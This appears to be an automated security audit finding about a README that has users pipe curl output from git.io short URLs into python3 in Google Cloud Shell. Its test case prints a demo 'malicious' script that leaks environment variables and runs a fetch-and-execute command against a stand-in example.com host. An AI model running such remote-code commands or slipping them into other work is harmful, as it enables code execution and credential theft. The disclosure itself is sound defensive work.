## Combined Vulnerability List

### Short URL Redirection leading to Arbitrary Code Execution
- **Vulnerability Name:** Short URL Redirection leading to Arbitrary Code Execution
- **Description:**
    1. The project documentation in `README.md` instructs users to copy and paste commands into Google Cloud Shell to execute scripts.
    2. These commands use `git.io` short URLs to fetch the Python scripts. For example, for GWMME, the command is `python3 <(curl -s -S -L https://git.io/gwmme-create-service-account)`.
    3. An attacker could compromise the `git.io` short URLs (e.g., `https://git.io/gwmme-create-service-account`, `https://git.io/gwm-create-service-account`, `https://git.io/password-sync-create-service-account`). `git.io` is a URL shortening service managed by GitHub, but vulnerabilities or compromises are possible even for reputable services.
    4. If a short URL is compromised, the attacker can redirect it to a malicious Python script hosted at a different URL.
    5. When a user copies the command from the documentation and executes it in Google Cloud Shell, `curl` will follow the compromised short URL and download the malicious script.
    6. The output of `curl` (the malicious script) is then piped directly to `python3` for execution within the user's Google Cloud Shell environment.
    7. This leads to arbitrary code execution in the context of the user's Cloud Shell, with the permissions and access associated with their Google Cloud account and active Cloud Shell session.
- **Impact:**
    - Critical. Successful exploitation allows for arbitrary code execution within the victim's Google Cloud Shell environment.
    - An attacker could potentially gain full control over the victim's Google Cloud project, including access to resources, data, and services.
    - Depending on the permissions of the user and the attacker's script, the attacker could:
        - Steal sensitive data, including service account keys, OAuth tokens, and other credentials stored in the Cloud Shell environment or accessible through Google Cloud APIs.
        - Modify or delete Google Cloud resources.
        - Pivot to other Google Cloud services or on-premises networks connected to the Google Cloud environment.
        - Impersonate the user or service accounts to perform actions within Google Workspace or other connected systems.
- **Vulnerability Rank:** Critical
- **Currently implemented mitigations:**
    - None. The project currently relies on the security of the `git.io` URL shortening service and provides no mechanisms to verify the integrity or authenticity of the scripts being downloaded and executed.
- **Missing mitigations:**
    - **Remove Short URLs:** Replace `git.io` short URLs in the documentation with direct, full URLs to the raw Python scripts hosted in the GitHub repository. This makes it more transparent where the script is being downloaded from and reduces the risk of redirection through a compromised URL shortening service. Example: `https://raw.githubusercontent.com/google/create-service-account/main/code/gwmme_create_service_account.py`
    - **Implement Script Verification:** Add a mechanism to verify the integrity and authenticity of the downloaded scripts. This could be done by:
        - Providing checksums (e.g., SHA256) of the scripts in the documentation, allowing users to manually verify the downloaded script before execution.
        - Digitally signing the scripts (e.g., using GPG) and providing instructions for users to verify the signature before execution.
    - **Documentation Warning:** Include a clear warning in the documentation about the security risks of executing scripts downloaded from the internet, even from seemingly reputable sources. Advise users to:
        - Carefully review the script content before executing it.
        - Download the script and inspect it locally instead of directly piping it to `python3`.
        - Only use the official source repository and avoid using potentially modified or untrusted copies of the scripts.
- **Preconditions:**
    - An attacker must successfully compromise the `git.io` short URLs used in the project documentation.
    - A user must follow the official documentation and copy and paste the provided command into their Google Cloud Shell environment without verifying the destination URL or script content.
- **Source code analysis:**
    - The vulnerability is not directly within the Python scripts (`gwmme_create_service_account.py`, `gwm_create_service_account.py`, `password_sync_create_service_account.py`) themselves.
    - The vulnerability stems from the project's documentation (`README.md`) and the practice of using `git.io` short URLs to distribute these scripts.
    - In `README.md`, under the "Usage" sections for each tool (GWMME, GWM, Password Sync), the recommended commands are structured as:
      ```markdown
      python3 <(curl -s -S -L https://git.io/[SHORT_URL])
      ```
    - This command structure does the following:
        1. `curl -s -S -L https://git.io/[SHORT_URL]`: This part uses `curl` to fetch content from the `git.io` short URL.
            - `-s`:  Silent mode, don't show progress meter or error messages.
            - `-S`: Show error messages if they occur.
            - `-L`: Follow redirects. This is crucial as `git.io` URLs redirect to the actual raw script URLs on GitHub.
        2. `<(...)`: This is process substitution in Bash. It takes the output of the command inside the parentheses (in this case, the output of `curl`) and makes it available as a file for the command outside (in this case, `python3`).
        3. `python3 <(...)`: This executes the `python3` interpreter, and the `<(...)` part effectively feeds the downloaded script as standard input to the `python3` interpreter, causing it to execute the script directly from the internet without saving it to disk first.

    ```

- **Security test case:**
    1. **Set up a malicious Python script:** Create a file named `malicious_script.py` with the following content:
        ```python
        #!/usr/bin/python3
        import os
        import sys

        print("WARNING: You are executing a malicious script!")
        print("This is a security test to demonstrate a vulnerability.")
        print("Current user:", os.getlogin())
        print("Current directory:", os.getcwd())
        print("Environment variables (first 5):")
        for key, value in list(os.environ.items())[:5]:
            print(f"  {key}={value}")

        # Optionally, attempt to perform a harmless but noticeable action
        # to further demonstrate code execution, e.g., create a file.
        try:
            with open("ATTACK_DEMO.txt", "w") as f:
                f.write("This file was created by a malicious script as part of a security test.")
            print("File 'ATTACK_DEMO.txt' created.")
        except Exception as e:
            print(f"Failed to create file: {e}")

        sys.exit(1) # Exit with an error code to be noticeable
        ```
    2. **Host the malicious script:** Make `malicious_script.py` accessible via a public URL. You can use a simple HTTP server (e.g., using `python -m http.server` and `ngrok` to expose it publicly) or a service like GitHub Gist (making sure to get the raw URL). Let's assume the malicious script is now accessible at `https://example.com/malicious_script.py`.
    3. **"Compromise" the short URL:**  Since we do not have control over `git.io`, we will simulate the compromise. For testing purposes, we will manually use the malicious URL instead of the `git.io` URL in the command. In a real attack scenario, an attacker would need to find a way to actually compromise the `git.io` redirection.
    4. **Follow the documentation steps for GWMME:** Refer to the "Google Workspace Migration for Microsoft Exchange (GWMME)" section in `README.md`.
    5. **Open Google Cloud Shell:** Open a new Google Cloud Shell session in your Google Cloud project.
    6. **Execute the modified command:** Instead of copying the command from the documentation, use a modified command that points to your malicious script URL:
        ```bash
        python3 <(curl -s -S -L https://example.com/malicious_script.py)
        ```
        Replace `https://example.com/malicious_script.py` with the actual URL where you hosted your `malicious_script.py`.
    7. **Observe the output:** Execute the command in Cloud Shell. Observe the output in the Cloud Shell terminal.
    8. **Verify successful execution of malicious script:**
        - You should see the warning message "WARNING: You are executing a malicious script!".
        - Information about the current user, directory, and environment variables should be printed, confirming the script executed in your Cloud Shell environment.
        - If the script successfully created the `ATTACK_DEMO.txt` file, you should see the "File 'ATTACK_DEMO.txt' created." message. You can then verify the file's existence using `ls`.
        - The command should exit with a non-zero exit code (1 in this case), which is also an indicator that the malicious script was executed as intended (as we explicitly set `sys.exit(1)` in the malicious script).
